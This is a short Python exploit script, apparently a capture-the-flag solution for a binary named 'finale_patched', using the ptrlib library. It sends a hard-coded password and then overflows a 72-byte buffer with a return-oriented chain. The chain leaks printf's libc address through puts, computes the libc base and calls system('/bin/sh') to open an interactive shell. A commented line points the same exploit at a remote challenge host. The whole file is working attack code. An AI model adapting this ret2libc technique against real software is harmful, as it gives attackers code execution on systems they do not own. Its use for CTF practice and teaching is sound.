#!/usr/bin/env python

import ptrlib as ptr


def unwrap(x):
    if x is None:
        exit(1)
    else:
        return x


elf = ptr.ELF("./finale_patched")
libc = ptr.ELF("./libc.so.6")
io = ptr.Process(elf.filepath)
# io = ptr.Socket("94.237.63.83", 42967)

io.sendline(b"s34s0nf1n4l3b00")

payload = b"A" * 72
payload += ptr.p64(next(elf.gadget("pop rdi; ret")))
payload += ptr.p64(unwrap(elf.got("printf")))
payload += ptr.p64(unwrap(elf.plt("puts")))
payload += ptr.p64(unwrap(elf.symbol("finale")))

io.sendline(payload)
io.recvuntil(b"Spirit be with you!\n")
io.recvline()
libc.base = ptr.u64(io.recvline()) - unwrap(libc.symbol("printf"))

payload = b"A" * 72
payload += ptr.p64(next(elf.gadget("ret")))
payload += ptr.p64(next(elf.gadget("pop rdi; ret")))
payload += ptr.p64(unwrap(next(libc.find("/bin/sh"))))
payload += ptr.p64(unwrap(libc.symbol("system")))
io.sendline(payload)

io.recvuntil(b"Spirit be with you!")
io.recvline()
io.recvline()

io.sh()
